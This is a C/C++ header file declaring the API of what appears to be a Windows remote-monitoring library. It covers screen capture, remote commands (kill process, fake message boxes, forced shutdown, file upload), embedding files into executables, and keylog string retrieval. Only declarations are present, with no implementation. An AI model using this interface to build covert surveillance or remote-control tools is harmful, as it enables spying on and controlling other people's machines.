
/*-----------Browse folder---------*/

extern "C" int GetFolderName(TCHAR *Caption,TCHAR  **lpszFolderName,HWND hWnd);
extern "C" HICON GetIconHandle(TCHAR *FileExtn);

/*-----------Generic Network Functions--------*/

extern "C" int GenericNetworkLastError(void);
extern "C" int LoadNetworkLibraryAndVersion(void);
extern "C" int CleanUpNetworkLibrary(void);

/*-----------Network Listening Functions--------*/

extern "C" UINT64  RegisterAsNwListenerUser(void);
extern "C" UINT64  RegisterAsNwListenerUserEx(TCHAR *IP,UINT Port);
extern "C" UINT64  RegisterAsNwListenerUserExx(int LocalHost,UINT Port=0);

extern "C" int    RemoveNwListenerUser(UINT64  Address);

extern "C" int ListenAt(UINT64  Address,TCHAR *IpAddress,UINT Port=0);
extern "C" int ListenAtEx(UINT64  Address,int LocalHost,UINT Port=0);
extern "C" int ListenLastError(UINT64  Address);
extern "C" int SetListenState(UINT64  Address,int On=1);
extern "C" int GetListenFlag(UINT64  Address);
extern "C" int RetrieveClient(UINT64  Address,UINT64 &ClientConnectionAddress);
extern "C" int RemoveClient(UINT64  Address,UINT64 &ClientConnectionAddress);
extern "C" int DisconnectListenConnection(UINT64  Address);


/*-----------Network Connecting  Functions--------*/

extern "C" UINT64  RegisterAsNwConnectionUser(void);
extern "C" int RemoveNwConnectionUser(UINT64  Address);

extern "C" int  ConnectionLastError(UINT64  Address);
extern "C" int ConnectTo(UINT64  Address,TCHAR *ServerIP,UINT ServerPort);
extern "C" int GetIPandPort(UINT64  Address,int OfRemoteHost,TCHAR *IP,UINT32 &Port);
extern "C" int SendByteStream(UINT64  Address,char *MessageBuffer,UINT32 NumberOfBytesToSend,UINT32 &NumberOfBytesSended);
extern "C" int ReceiveByteStream(UINT64  Address,char *MessageBuffer,UINT32 NumberOfBytesToReceive,UINT32 &NumberOfBytesReceived);
extern "C" int Disconnect(UINT64  Address);


/*-----------XML utility Functions--------*/

extern "C" UINT64  RegisterAsXmlUtilityUser(void);
extern "C" int RemoveXmlUtilityUser(UINT64  Address);

extern "C" int CreateNewXmlDocumentX(UINT64  Address,TCHAR* NewXML_FullFileName,TCHAR *RootNodeName);
extern "C" int OpenXmlDocumentX(UINT64  Address,TCHAR* bstrXmlFullFileName); 
 
extern "C" int GetNodeTextFromHeirarchyX(UINT64  Address,TCHAR *Heirarchy,TCHAR* NodeText,int BeginAtRoot=1);
extern "C" int GetNodeAttributeFromHeirarchyX(UINT64  Address,TCHAR *Heirarchy,TCHAR *AttributeName,TCHAR* AttributeValue,int BeginAtRoot=1);
extern "C" int GetNodeNameX(UINT64  Address,TCHAR* NodeName,int OfRootNode=1);
extern "C" TCHAR *GetErrorX(UINT64  Address);
 
extern "C" int SetTextIntoHeirarchyX(UINT64  Address,TCHAR *Heirarchy,TCHAR *Text,int BeginAtRoot=1);
extern "C" int SetNodeTextIntoHeirarchyX(UINT64  Address,TCHAR *Heirarchy,TCHAR *NodeToBeCreated,TCHAR *NodeValue,int BeginAtRoot=1);
extern "C" int SetNodeAttributeIntoHeirarchyX(UINT64  Address,TCHAR *Heirarchy,TCHAR *AttributeToBeCreated,TCHAR *AttributeValue,int BeginAtRoot=1);
extern "C" int SetForceCreateX(UINT64  Address,int MakeOnState=0);
extern "C" int SetTokenSeperatorX(UINT64  Address,TCHAR *TokenSeperator=_T("/"));
 
extern "C" int InsertAllNodesFromX(UINT64  Address,TCHAR* XML_FileToBeMerged,int InsertAtRoot=1);
extern "C" int InsertSelectedNodesFromX(UINT64  Address,UINT64  AddressToBeCopied,int InsertAtRoot=1); 
 
extern "C" int MoveToChildByIndexX(UINT64  Address,TCHAR *ParentNodeHeirarchy,long ChildIndex=0,int BeginAtRoot=1);
extern "C" int MoveToChildByNameX(UINT64  Address,TCHAR *ParentNodeHeirarchy,TCHAR *ChildName,int BeginAtRoot=1);
extern "C" int MoveToBrotherX(UINT64  Address,int Older=0);
extern "C" int MoveToParentX(UINT64  Address);
 
extern "C" int ResetSearchPointerToRootX(UINT64  Address);
extern "C" long NumberOfBrothersX(UINT64  Address);
extern "C" long NumberOfChildrenX(UINT64  Address,int OfRootNode=1);

/*-----------Screen Monitor Functions--------*/

extern "C" UINT64 RegisterAsScreenMonitorUser(BYTE Compression=SCREEN_MONITOR_COMPRESS_NIL);
extern "C"   int  RemoveScreenMonitorUser(UINT64  Address);

extern "C" int SetCompression(UINT64  Address,BYTE Compression);
extern "C" int SetType(UINT64  Address,BYTE TransferItemType);

extern "C" int CaptureDesktopImage(UINT64  Address);
extern "C" int CaptureWindowImage(UINT64  Address,HWND hWnd=0);
extern "C" int SaveBitmapToFile(UINT64  Address,TCHAR *FileName,int IsCompress=0);

extern "C" int ReplaceDesktopImage(UINT64  Address);
extern "C" int ReplaceWindowImage(UINT64  Address,HWND hWnd=0);
extern "C" int LoadBitmapFromFile(UINT64  Address,TCHAR *FileName,int IsCompressed=0);

//-----------------ExeEditor Functions-------------------------//

extern "C" UINT64 RegisterAsExeEditor(void);
extern "C" UINT64 RegisterAsExeEditorEx(TCHAR *exeNameWithFullPath);
extern "C" UINT64 RegisterAsExeEditorExx(TCHAR *exeNameWithFullPath,TCHAR *ResourceName,TCHAR *ResourceType);
extern "C" int RemoveExeEditor(UINT64  Address);
extern "C" int ErrorFlag(UINT64  Address);
extern "C" int SetExeFileName(UINT64  Address,TCHAR *exeNameWithFullPath);
extern "C" int SetResourceInfo(UINT64  Address,TCHAR *ResourceName,TCHAR *ResourceType);
extern "C" int EmbedFileToexe(UINT64  Address,TCHAR *FileNamewithFullPath);
extern "C" int ExtractFileFromExe(UINT64  Address,TCHAR *FileNameWithExtnToSave);


//--------------Command Monitor Client Functions-------------//

extern "C" UINT64 RegisterAsCommandMonitorClient(UINT32 CommandType=COMMAND_MONITOR_NULL_COMMAND,TCHAR *CommandArgs=0,UINT32 Compression=COMMAND_MONITOR_COMPRESS_NIL,TCHAR ResultSeperator=_T('\n'));
extern "C"  int RemoveCommandMonitorClient(UINT64  Address);
extern "C" UINT32 CMCGetResultantType(UINT64  Address);
extern "C" int CMCSetCommand(UINT64  Address,UINT32 CommandType,TCHAR *CommandArgs=0);
extern "C" int CMCSetProcessPriority(UINT64  Address,UINT32 ProcessID,BYTE PriorityLevel);
extern "C" int CMCSetKillProcess(UINT64  Address,UINT32 ProcessID);
extern "C" int CMCSetFakeMessage(UINT64  Address,TCHAR *MsgTxt,TCHAR *MsgCap,BYTE MsgType);
extern "C" int CMCSetCompression(UINT64  Address,UINT32 Compression);
extern "C" int CMCSetTokenSeperator(UINT64  Address,TCHAR ResultSeperator=_T('\n'));
extern "C" int CMCGetResult(UINT64  Address,BYTE *bytptrResult,UINT32 &ResultLength);
extern "C" int CMCSaveRemoteFile(UINT64  Address,TCHAR *FileName,TCHAR *DstRootDirPath);
extern "C" int CMCSetRemoteServerCompression(UINT64  Address,UINT32 uint32Compression);
extern "C" int CMCSetSystemDownMode(UINT64  Address,int ForceDown);
extern "C" int CMCSetFileUpLoad(UINT64  Address,TCHAR *SrcRoot,TCHAR *FileName,TCHAR *TarRoot);

//-------------File Monitor Functions-------------//

extern "C" UINT64 RegisterAsFileMonitor(void);
extern "C" int RemoveFileMonitor(UINT64  Address);
extern "C" int CFMSetFileDataStream(UINT64  Address,BYTE *FileDataStream,UINT32 LengthOfBytes);
extern "C" int CFMSetFileDataStreamEx(UINT64  Address,UINT64 CmdMonitorAddress);
extern "C" int CFMGetFirstFile(UINT64  Address,TCHAR *FileInfo,BYTE InfoLevel,UINT32 &ResultLength);
extern "C" int CFMGetNextFile (UINT64  Address,TCHAR *FileInfo,BYTE InfoLevel,UINT32 &ResultLength);
extern "C" int CFMGetCurrentFileType(UINT64  Address,BYTE &FileType);
extern "C" int CFMGetCurrentFile(UINT64  Address,TCHAR *FileInfo,BYTE InfoLevel,UINT32 &ResultLength);
extern "C" long CFMGetNumberOfFiles(UINT64  Address);
extern "C" int CFMGetCurrentFileSize(UINT64  Address,UINT32 &FileSize);
extern "C" int CFMIsCurrentFileIsDir(UINT64  Address);

//-------------Screen Monitor Messenger Functions---------//

extern "C" UINT64 RegisterAsCScreenMonitorMessenger(void);
extern "C" int RemoveScreenMonitorMessenger(UINT64 Address);
extern "C" int ScreenMonitorMessengerSetMessageType(UINT64 Address,BYTE MsgType,BYTE *MsgArgs=0,long ArgLen=0);

//-------------WinMonitor Messenger Functions-------------//

extern "C" UINT64 RegisterAsWinMonitorMessenger(UINT64 ConnectionAddress=0);
extern "C" int RemoveWinMonitorMessenger(UINT64 Address);
extern "C" int WinMonitorMessengerSetConnection(UINT64  Address,UINT64 ConnectionAddress=0);
extern "C" int WinMonitorMessengerSynchronizeServer(UINT64  Address,int FromServer=1);
extern "C" int WinMonitorMessengerAuthenticate(UINT64  Address,TCHAR *PassWord=0);
extern "C" int WinMonitorMessengerRegisterType(UINT64  Address,BYTE ServiceType);
extern "C" int WinMonitorMessengerShutDown(UINT64  Address);

extern "C" int WinMonitorMessengerExecuteCommandMonitorClient(UINT64  Address,UINT64 CommandMonitorClientAddress);
extern "C" int WinMonitorMessengerExecuteScreenMonitorMessenger(UINT64  Address,UINT64 SMessengerAddress,UINT64 ScreenMonitorAddress); 

//----------------CMainMemory & COsMonitor Functions--------------------------//

extern "C" UINT64 RegisterAsMainMemoryMonitor(BYTE *MainMemoryInfoStream=0,TCHAR *TokenSeperator=_T("\n"));
extern "C" int RemoveMainMemoryMonitor(UINT64  Address);
extern "C" int SetMemoryInfoStream(UINT64  Address,BYTE *MainMemoryInfoStream,TCHAR *TokenSeperator=_T("\n"));
extern "C" int GetMainMemoryStatus(UINT64  Address,TCHAR *MainMemoryStatus,UINT32 &ResultLength);
extern "C" int GetVirtualMemoryStatus(UINT64  Address,TCHAR *VirtualMemoryStatus,UINT32 &ResultLength);

extern "C" UINT64 RegisterAsOSMonitor(BYTE *OSInfoStream=0,TCHAR *TokenSeperator=_T("\n"));
extern "C" int RemoveOSMonitor(UINT64  Address);
extern "C" int SetOSInfoStream(UINT64  Address,BYTE *OSInfoStream,TCHAR *TokenSeperator=_T("\n"));
extern "C" int GetOSInformation(UINT64  Address,TCHAR *OSInfo,UINT32 &ResultLength);


//-------------WinMonitor Messenger Functions-------------//

extern "C" UINT64 RegisterAsChatClient(UINT64 ConnectionAddress=0);
extern "C" int RemoveChatClient(UINT64 Address);
extern "C" int ChatClientSetConnection(UINT64  Address,UINT64 ConnectionAddress=0);
extern "C" int ChatClientSynchronizeServer(UINT64  Address);
extern "C" int ChatClientAuthenticate(UINT64  Address,TCHAR *PassWord=0);
extern "C" int ChatClientRegisterType(UINT64  Address,BYTE ServiceType);
extern "C" int ChatClientShutDown(UINT64  Address);
extern "C" int ChatClientSendChatString(UINT64  Address,TCHAR *srcString);
extern "C" int ChatClientReceieveChatString(UINT64  Address,TCHAR *dstString,UINT32 &strLen);
extern "C" int ChatClientReceieveOnLineKeyLogString(UINT64  Address,TCHAR *dstString,UINT32 &strLen);

//-------------------------------------------------------------------//
